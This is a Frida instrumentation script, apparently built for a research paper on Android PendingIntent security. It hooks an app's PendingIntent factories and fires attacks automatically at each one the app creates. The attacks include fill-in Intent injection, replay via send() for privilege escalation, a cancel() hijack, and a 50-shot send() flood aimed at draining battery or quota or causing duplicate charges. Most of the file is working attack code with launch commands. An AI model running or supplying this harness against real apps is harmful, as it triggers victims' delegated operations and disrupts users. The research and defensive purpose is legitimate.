'use strict';

/*
 * ==========================================================
 * PendingIntent Attack Simulator
 * ==========================================================
 *
 * Purpose
 * -------
 * Extends pendingintent_monitor.js from passive observation to active
 * exploitation. Hooks the same PendingIntent factory methods, and on
 * every PendingIntent created by the target app, immediately attempts
 * three attacker-style operations against the captured reference:
 *
 *   Attack A - Fill-in Intent injection
 *              Calls getIntent()/fillIn-style mutation via the
 *              PendingIntent's underlying Intent (where obtainable) or
 *              attempts IntentSender-based redirection, simulating an
 *              attacker who intercepted the PI and tries to redirect
 *              its target component/action/data.
 *
 *   Attack B - Privilege escalation via send()
 *              Calls PendingIntent.send() from this (attacker) process
 *              context to see whether the delegated capability executes
 *              the creator's privileged operation on the attacker's
 *              behalf.
 *
 *   Attack C - cancel() ownership hijack
 *              Calls PendingIntent.cancel() to see whether a
 *              non-creator can revoke/destroy the creator's capability.
 *
 * This mirrors the MalwareApp attack variants (A/B/C) used in Phase A
 * of the paper's RQ2b baseline evaluation: run this INSTEAD of a real
 * separate malware app when you want a single-process proof that the
 * candidate's PendingIntent is exploitable, without needing to build
 * and install a companion attacker APK.
 *
 * NOTE ON SCOPE
 * -------------
 * This script only reproduces Phase A (baseline exploitation against
 * the unprotected app). It does NOT implement any defensive framework
 * (that would be Phase B in the reference paper) - there is nothing
 * here to be "blocked", so every attack should be expected to run to
 * completion. What is logged is whether the call executed without a
 * SecurityException, and the low-level Android-side outcome.
 *
 * Usage
 * -----
 *   frida -U -f <package.name> -l pendingintent_attack_sim.js --no-pause
 *   frida -U -n <process name>  -l pendingintent_attack_sim.js
 *
 * Output is JSON-lines on stdout; capture with:
 *   frida -U -f <pkg> -l pendingintent_attack_sim.js -o run.log
 */

Java.perform(function () {

    console.log("==========================================");
    console.log("[+] PendingIntent Attack Simulator");
    console.log("[+] Target process: " + Process.id);
    console.log("==========================================");

    var PendingIntent = Java.use("android.app.PendingIntent");
    var Intent = Java.use("android.content.Intent");

    // Track captured PendingIntent instances so we don't attack the same
    // one twice per hook re-entry.
    var attacked = {};

    function logEvent(type, data) {
        console.log(
            JSON.stringify({
                timestamp: new Date().toISOString(),
                pid: Process.id,
                event: type,
                data: data
            })
        );
    }

    function pendingIntentInfo(pi) {
        if (pi === null || pi === undefined) {
            return "PendingIntent=null";
        }
        var result = [];
        try { result.push("creatorPackage=" + pi.getCreatorPackage()); } catch (e) {}
        try { result.push("creatorUid=" + pi.getCreatorUid()); } catch (e) {}
        try { result.push("targetPackage=" + pi.getTargetPackage()); } catch (e) {}
        return result.join(" | ");
    }

    function keyFor(pi) {
        // Use the underlying IIntentSender's identity hash where possible -
        // pi.toString() on Android's PendingIntent already embeds the
        // Binder token identity, so equal-target PendingIntents (e.g. the
        // same alarm re-registered with FLAG_UPDATE_CURRENT) collapse to
        // the same key and are only attacked once, instead of once per
        // JVM-level object instance.
        try {
            return pi.toString();
        } catch (e) {
            return "unknown-" + Math.random();
        }
    }

    /*
     * ---------------------------------------------------------
     * Attack A: fill-in Intent injection
     *
     * Builds a malicious Intent redirecting to an attacker-chosen
     * component/action/data, then attempts to dispatch the captured
     * PendingIntent with it via send(Context, int, Intent). If the
     * underlying base Intent was created with an implicit/mutable
     * configuration, the system fills in the malicious fields before
     * dispatch - this is the CVE-2021-25352 / CVE-2022-22286 pattern.
     * ---------------------------------------------------------
     */
    function attackA_fillInInjection(pi, apiName) {
        var outcome = { attack: "A_fillin_injection", api: apiName, status: "ATTEMPTED" };

        try {
            var ActivityThread = Java.use("android.app.ActivityThread");
            var context = ActivityThread.currentApplication().getApplicationContext();

            var maliciousIntent = Java.use("android.content.Intent").$new();
            maliciousIntent.setAction("com.malware.ATTACKER_ACTION");
            maliciousIntent.putExtra("attacker_payload", "injected_by_frida_attack_sim");

            // send(Context, int, Intent) triggers Intent.fillIn() internally
            // on the PendingIntent's underlying Intent when it is mutable.
            var sendOverloads = PendingIntent.send.overloads;
            var matched = false;

            sendOverloads.forEach(function (ov) {
                if (matched) return;
                // look for the (Context, int, Intent) or (Context, int, Intent, ...) overload
                var argTypes = ov.argumentTypes;
                if (argTypes.length >= 3 &&
                    argTypes[0].className === "android.content.Context" &&
                    argTypes[2].className === "android.content.Intent") {
                    matched = true;
                    try {
                        if (argTypes.length === 3) {
                            ov.call(pi, context, 0, maliciousIntent);
                        } else if (argTypes.length === 6) {
                            ov.call(pi, context, 0, maliciousIntent, null, null, null);
                        }
                        outcome.status = "EXECUTED_NO_EXCEPTION";
                        outcome.detail = "fill-in intent dispatched without SecurityException";
                    } catch (sendErr) {
                        outcome.status = "EXCEPTION";
                        outcome.detail = safeStr(sendErr);
                    }
                }
            });

            if (!matched) {
                outcome.status = "NO_MATCHING_OVERLOAD";
                outcome.detail = "no send(Context,int,Intent[,...]) overload found on this PendingIntent";
            }

        } catch (e) {
            outcome.status = "SETUP_ERROR";
            outcome.detail = safeStr(e);
        }

        return outcome;
    }

    /*
     * ---------------------------------------------------------
     * Attack B: privilege escalation via send()
     *
     * Plain send() with no arguments, invoked from the attacker's
     * process. If this succeeds, the attacker has triggered the
     * creator's delegated (and potentially privileged) operation
     * purely by possessing the PendingIntent reference.
     * ---------------------------------------------------------
     */
    function attackB_privilegeEscalation(pi, apiName) {
        var outcome = { attack: "B_privilege_escalation", api: apiName, status: "ATTEMPTED" };

        try {
            pi.send();
            outcome.status = "EXECUTED_NO_EXCEPTION";
            outcome.detail = "send() succeeded from attacker context - delegated operation triggered";
        } catch (e) {
            outcome.status = "EXCEPTION";
            outcome.detail = safeStr(e);
        }

        return outcome;
    }

    /*
     * ---------------------------------------------------------
     * Attack C: cancel() ownership hijack
     *
     * Attempts to revoke the creator's capability. Android's native
     * PendingIntent enforces a UID check for cancel() at the system
     * service, so this is expected to typically fail/no-op for a
     * non-creator - the point of logging it is to record whether that
     * protection is actually in effect for this specific target.
     * ---------------------------------------------------------
     */
    function attackC_cancelHijack(pi, apiName) {
        var outcome = { attack: "C_cancel_hijack", api: apiName, status: "ATTEMPTED" };

        try {
            pi.cancel();
            outcome.status = "EXECUTED_NO_EXCEPTION";
            outcome.detail = "cancel() completed without SecurityException from attacker context";
        } catch (e) {
            outcome.status = "EXCEPTION";
            outcome.detail = safeStr(e);
        }

        return outcome;
    }

    function safeStr(e) {
        try { return e.toString(); } catch (_) { return "unknown error"; }
    }

    /*
     * ---------------------------------------------------------
     * Attack D: flood / resource-exhaustion disruption
     *
     * Since Attack C (cancel()) is blocked by Android's own creator-UID
     * check regardless of app behaviour, this targets the same
     * "disrupt/harm without needing ownership" goal via a different
     * mechanism: repeated send() with no delay, simulating an attempt to
     * exhaust whatever resource the creator's delegated action consumes
     * each time it fires (battery, network quota, duplicate side effects
     * such as duplicate notifications, duplicate scheduled work, or
     * duplicate charges/confirmations if the target performs one).
     * Verified working against a synthetic victim/malware pair
     * (50/50 executed, 0 exceptions) prior to this generalisation.
     * ---------------------------------------------------------
     */
    var FLOOD_ITERATIONS = 50;

    function attackD_floodDisruption(pi, apiName) {
        var outcome = { attack: "D_flood_disruption", api: apiName, status: "ATTEMPTED" };
        var executed = 0;
        var exceptions = 0;
        var start = Date.now();

        for (var i = 0; i < FLOOD_ITERATIONS; i++) {
            try {
                pi.send();
                executed++;
            } catch (e) {
                exceptions++;
            }
        }

        outcome.status = "COMPLETED";
        outcome.iterations = FLOOD_ITERATIONS;
        outcome.executed = executed;
        outcome.exceptions = exceptions;
        outcome.elapsedMs = Date.now() - start;
        return outcome;
    }

    /*
     * ---------------------------------------------------------
     * Attack E: fill-in component-redirect probe
     *
     * Generalised, app-agnostic version of the redirect test run against
     * the synthetic VictimApp/MalwareApp pair. There, redirecting to a
     * real (but benign) DecoyReceiver via setClassName() in the fill-in
     * Intent produced send()-succeeds-without-exception in EVERY case,
     * yet the decoy never actually fired - because Android's
     * Intent.fillIn() only overwrites the base Intent's component field
     * if it is currently UNSET, and the victim's base Intent already had
     * an explicit component. "No exception" was therefore NOT evidence
     * the redirect took effect.
     *
     * Against arbitrary real apps we cannot plant an observable decoy
     * component inside them, so this probe instead uses a DELIBERATELY
     * NONEXISTENT class name in the same package as the target. This
     * turns the same underlying question into an observable side effect
     * without needing any cooperation from the target app:
     *
     *   - If fillIn() HONOURS the override (base Intent's component was
     *     unset/implicit - the v1 static-triage pattern), dispatch is
     *     attempted against the bogus class name and Android throws a
     *     runtime error such as "Unable to find explicit activity/
     *     service/receiver class" - i.e. an EXCEPTION here is POSITIVE
     *     evidence the redirect worked (the vulnerability is present).
     *   - If fillIn() IGNORES the override (base Intent already had an
     *     explicit component - matches what we found for the synthetic
     *     victim), dispatch silently proceeds against the REAL,
     *     unchanged target and send() reports success with no
     *     exception - i.e. EXECUTED_NO_EXCEPTION here means the redirect
     *     did NOT take effect, mirroring the confirmed synthetic result.
     *
     * This directly probes the same mechanism the static analyzer's v1
     * category (empty/implicit base Intent) is meant to flag, using a
     * real dynamic side effect instead of a static heuristic.
     * ---------------------------------------------------------
     */
    function attackE_redirectProbe(pi, apiName, creatorPackage) {
        var outcome = { attack: "E_redirect_probe", api: apiName, status: "ATTEMPTED" };

        try {
            var ActivityThread = Java.use("android.app.ActivityThread");
            var context = ActivityThread.currentApplication().getApplicationContext();

            var bogusIntent = Java.use("android.content.Intent").$new();
            var bogusClassName = "definitely.not.a.real.ClassXYZ123Probe";
            bogusIntent.setClassName(creatorPackage || "unknown.package", bogusClassName);

            var sendOverloads = PendingIntent.send.overloads;
            var matched = false;

            sendOverloads.forEach(function (ov) {
                if (matched) return;
                var argTypes = ov.argumentTypes;
                if (argTypes.length >= 3 &&
                    argTypes[0].className === "android.content.Context" &&
                    argTypes[2].className === "android.content.Intent") {
                    matched = true;
                    try {
                        if (argTypes.length === 3) {
                            ov.call(pi, context, 0, bogusIntent);
                        } else if (argTypes.length === 6) {
                            ov.call(pi, context, 0, bogusIntent, null, null, null);
                        }
                        outcome.status = "EXECUTED_NO_EXCEPTION";
                        outcome.detail = "redirect to nonexistent class did NOT throw - fillIn() likely IGNORED "
                            + "the component override (base Intent already had an explicit component); "
                            + "dispatch proceeded to the real, unchanged target - redirect NOT effective";
                        outcome.redirectEffective = false;
                    } catch (sendErr) {
                        outcome.status = "EXCEPTION";
                        outcome.detail = safeStr(sendErr);
                        outcome.redirectEffective = true;
                    }
                }
            });

            if (!matched) {
                outcome.status = "NO_MATCHING_OVERLOAD";
                outcome.detail = "no send(Context,int,Intent[,...]) overload found on this PendingIntent";
            }

        } catch (e) {
            outcome.status = "SETUP_ERROR";
            outcome.detail = safeStr(e);
        }

        return outcome;
    }

    /*
     * ---------------------------------------------------------
     * Hook every PendingIntent creation factory and fire the three
     * attacks against the freshly created capability.
     * ---------------------------------------------------------
     */
    function hookAndAttack(methodName) {
        try {
            var overloads = PendingIntent[methodName].overloads;

            overloads.forEach(function (ov) {
                ov.implementation = function () {
                    var pi = ov.apply(this, arguments);

                    try {
                        var k = keyFor(pi);
                        if (!attacked[k]) {
                            attacked[k] = true;

                            logEvent("PI_CAPTURED", {
                                api: methodName,
                                pendingIntent: pendingIntentInfo(pi)
                            });

            var results = [];

                            if (pi === null || pi === undefined) {
                                // A null return is legitimate Android behaviour
                                // (e.g. FLAG_NO_CREATE with no existing match) -
                                // there is nothing to attack, and calling methods
                                // on it would throw a TypeError that looks like a
                                // blocked attack but isn't. Record it distinctly.
                                var nullOutcome = { status: "NULL_PENDING_INTENT", detail: "factory returned null - nothing to attack" };
                                results.push({ attack: "A_fillin_injection", api: methodName, status: nullOutcome.status, detail: nullOutcome.detail });
                                results.push({ attack: "B_privilege_escalation", api: methodName, status: nullOutcome.status, detail: nullOutcome.detail });
                                results.push({ attack: "C_cancel_hijack", api: methodName, status: nullOutcome.status, detail: nullOutcome.detail });
                            } else {
                                var creatorPackage = null;
                                try { creatorPackage = pi.getCreatorPackage(); } catch (cpErr) {}

                                // NOTE: Attack C (cancel()) is intentionally
                                // OMITTED from this combined run. When this
                                // script attaches to the target app's own
                                // process (frida -f <target-app>), a cancel()
                                // call executes with the CREATOR's own UID,
                                // not an attacker's - so it is not a
                                // meaningful cross-app ownership-hijack test
                                // in this configuration, AND, more importantly,
                                // it actually cancels the underlying
                                // PendingIntent record, which then makes every
                                // subsequent attack (D, E) fail with
                                // PendingIntent$CanceledException for a reason
                                // that has nothing to do with D/E's own logic.
                                // Attack C was separately verified (see
                                // attack_results.csv from the dedicated,
                                // C-only run) using a genuine second app/UID
                                // (MalwareApp vs VictimApp), where it
                                // correctly triggered a SecurityException.
                                // Keeping it out of THIS run keeps D and E's
                                // results valid and attributable to their own
                                // mechanisms only.
                                results.push(attackA_fillInInjection(pi, methodName));
                                results.push(attackB_privilegeEscalation(pi, methodName));
                                results.push(attackD_floodDisruption(pi, methodName));
                                results.push(attackE_redirectProbe(pi, methodName, creatorPackage));
                            }

                            logEvent("ATTACK_RESULTS", {
                                api: methodName,
                                pendingIntent: pendingIntentInfo(pi),
                                results: results
                            });
                        }
                    } catch (attackErr) {
                        logEvent("ATTACK_HARNESS_ERROR", {
                            api: methodName,
                            error: safeStr(attackErr)
                        });
                    }

                    return pi;
                };
            });

            console.log("[+] Hooked+attacking PendingIntent." + methodName);

        } catch (e) {
            console.log("[-] Failed to hook " + methodName + ": " + e);
        }
    }

    hookAndAttack("getActivity");
    hookAndAttack("getActivities");
    hookAndAttack("getBroadcast");
    hookAndAttack("getService");
    hookAndAttack("getForegroundService");

    console.log("[+] Attack simulator ready - attacks fire automatically on every PendingIntent creation");
});
